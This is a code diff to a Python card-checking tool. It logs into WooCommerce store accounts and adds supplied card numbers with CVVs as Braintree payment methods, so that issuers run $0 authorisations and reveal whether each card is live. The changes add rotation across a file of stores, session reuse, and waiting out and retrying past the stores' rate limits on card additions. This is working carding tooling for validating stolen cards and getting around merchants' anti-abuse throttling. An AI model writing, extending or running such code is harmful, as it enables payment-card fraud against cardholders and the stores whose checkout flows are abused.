@@ -1,3 +1,4 @@
+import asyncio
 import httpx
 import os
 import re
@@ -51,6 +52,33 @@ WC_ACCOUNT = {
     "fingerprint": os.environ.get("B3_BT_FINGERPRINT", "").strip(),
     "config_data": os.environ.get("B3_BT_CONFIG", "").strip(),
 }
+
+# The stores the braintree auth asks, in the order they are tried.  The
+# list is a file on the server, so no store sits in the code.
+ACCOUNTS_FILE = os.environ.get("B3_WC_ACCOUNTS_FILE", "").strip()
+
+
+def account_stores():
+    """The stores to ask, in order.
+
+    Each one may name its own account, its own publishable fingerprint
+    and its own plugin settings.  A store that cannot be reached is
+    passed over and the next one gets a turn.
+    """
+    out = []
+    if ACCOUNTS_FILE:
+        try:
+            with open(ACCOUNTS_FILE, encoding="utf-8") as f:
+                data = json.load(f)
+        except Exception:
+            data = []
+        for entry in (data or []):
+            if isinstance(entry, dict) and entry.get("url"):
+                out.append(dict(entry))
+    if not out and WC_ACCOUNT.get("url"):
+        out.append(dict(WC_ACCOUNT))
+    return out
+
 
 # The answer, in the words the operator's own script uses.
 def _verdict_from_reason(reason):
@@ -621,6 +649,17 @@ def _add_captcha_to_html(html, token):
     return html
 
 
+def _wait_seconds(text):
+    """How long the store asked us to wait, in seconds.
+
+    The store lets one card be added every twenty seconds or so.  It
+    says how long to wait, so the check waits that long and asks again
+    instead of giving up on the card.
+    """
+    m = re.search(r"wait for (\d+) second", str(text or ""), re.I)
+    return (int(m.group(1)) + 1) if m else 0
+
+
 def _reason_from_page(text):
     """The refusal the store wrote on the page.
 
@@ -702,29 +741,34 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
         "Accept-Language": "en-US,en;q=0.9",
     }
 
-    # 1. the account page, for the login nonce
-    r = await client.get(f"{base}/my-account/", headers=headers_page)
-    if r.status_code != 200:
-        return None, f"the account page answered {r.status_code}", None
-    m = re.search(r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)', r.text) \
-        or re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']woocommerce-login-nonce', r.text)
-    if not m:
-        return None, "the store gave no login nonce", None
-    login_nonce = m.group(1)
+    def _logged_in():
+        return any(c.startswith("wordpress_logged_in") for c in client.cookies.keys())
 
-    # 2. log in
-    r = await client.post(
-        f"{base}/my-account/",
-        headers={**headers_page, "Content-Type": "application/x-www-form-urlencoded",
-                 "Origin": base, "Referer": f"{base}/my-account/"},
-        data={
-            "username": site["user"], "password": site["password"],
-            "rememberme": "forever",
-            "woocommerce-login-nonce": login_nonce,
-            "_wp_http_referer": "/my-account/", "login": "Log in",
-        })
-    if not any(c.startswith("wordpress_logged_in") for c in client.cookies.keys()):
-        return None, "the store did not accept the login", None
+    # 1/2. log in, unless the session is still alive.  A session that is
+    # still good saves the login, and a store that is busy with logins
+    # is a store that answers slowly.
+    if not _logged_in():
+        r = await client.get(f"{base}/my-account/", headers=headers_page)
+        if r.status_code != 200:
+            return None, f"the account page answered {r.status_code}", None
+        m = re.search(r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)', r.text) \
+            or re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']woocommerce-login-nonce', r.text)
+        if not m:
+            return None, "the store gave no login nonce", None
+        login_nonce = m.group(1)
+
+        r = await client.post(
+            f"{base}/my-account/",
+            headers={**headers_page, "Content-Type": "application/x-www-form-urlencoded",
+                     "Origin": base, "Referer": f"{base}/my-account/"},
+            data={
+                "username": site["user"], "password": site["password"],
+                "rememberme": "forever",
+                "woocommerce-login-nonce": login_nonce,
+                "_wp_http_referer": "/my-account/", "login": "Log in",
+            })
+        if not _logged_in():
+            return None, "the store did not accept the login", None
 
     # 3. the add payment method page, for the two nonces it carries
     r = await client.get(f"{base}/my-account/add-payment-method/",
@@ -801,12 +845,26 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
         return None, f"the card was not accepted by braintree: {msg or 'no token'}", card_info or None
 
     # 6. add the payment method: the store asks the issuer here
+    device_data = json.dumps({"correlation_id": session_id})
     form = {
-        "payment_method": "braintree_cc",
+        # The plugin names the payment method two ways; the store reads
+        # the one it knows, so both names are sent.
+        "payment_method": site.get("payment_method") or "braintree_cc",
         "braintree_cc_nonce_key": token,
-        "braintree_cc_device_data": json.dumps({"correlation_id": session_id}),
+        "braintree_cc_device_data": device_data,
         "braintree_cc_3ds_nonce_key": "",
         "braintree_cc_config_data": site.get("config_data") or "",
+        "wc_braintree_credit_card_payment_nonce": token,
+        "wc_braintree_device_data": device_data,
+        "wc-braintree-credit-card-card-type": str(card_info.get("brandCode") or "visa").lower(),
+        "wc-braintree-credit-card-3d-secure-enabled": "",
+        "wc-braintree-credit-card-3d-secure-verified": "",
+        "wc-braintree-credit-card-3d-secure-order-total": "0.00",
+        "wc-braintree_paypal_payment_nonce": "",
+        "wc-braintree-paypal-context": "shortcode",
+        "wc_braintree_paypal_amount": "0.00",
+        "wc_braintree_paypal_currency": "USD",
+        "wc_braintree_paypal_locale": "en_us",
         "woocommerce-add-payment-method-nonce": woo_nonce,
         "_wp_http_referer": "/my-account/add-payment-method/",
         "woocommerce_add_payment_method": "1",
@@ -870,18 +928,30 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
             # 0. the WooCommerce account.  The card is added as a payment
             #    method and the store asks the issuer to verify it, so
             #    the answer is the issuer's and it is a real $0 auth.
-            if WC_ACCOUNT.get("url") and WC_ACCOUNT.get("user"):
-                elapsed = round(time.time() - start, 2)
-                try:
-                    verdict, detail, card_info = await _wc_account_check(
-                        client, WC_ACCOUNT, cc, mm, yy, cvv)
-                except Exception as e:
-                    verdict, detail, card_info = None, f"{type(e).__name__}: {str(e)[:60]}", None
-                if verdict:
-                    info = _parse_card_info(card_info) if card_info else "??"
-                    return f"{verdict} - {detail} | {info} [{elapsed}s]"
-                logger.info("BT: the account site did not answer (%s), trying the "
-                            "other sites", detail)
+            for account in account_stores():
+                if not account.get("url") or not account.get("user"):
+                    continue
+                for attempt in (1, 2):
+                    elapsed = round(time.time() - start, 2)
+                    try:
+                        verdict, detail, card_info = await _wc_account_check(
+                            client, account, cc, mm, yy, cvv)
+                    except Exception as e:
+                        verdict, detail, card_info = None, f"{type(e).__name__}: {str(e)[:60]}", None
+                    if verdict:
+                        info = _parse_card_info(card_info) if card_info else "??"
+                        return f"{verdict} - {detail} | {info} [{elapsed}s]"
+                    wait = _wait_seconds(detail)
+                    if attempt == 1 and wait:
+                        # the store asked us to slow down.  It says how
+                        # long, so the check waits and asks again.
+                        logger.info("BT: the store %s asked us to wait %ss, waiting",
+                                    account.get("url"), wait)
+                        await asyncio.sleep(wait)
+                        continue
+                    logger.info("BT: the store %s did not answer (%s), trying the next",
+                                account.get("url"), detail)
+                    break
 
             for site_info in sites:
                 site_url = site_info["url"]
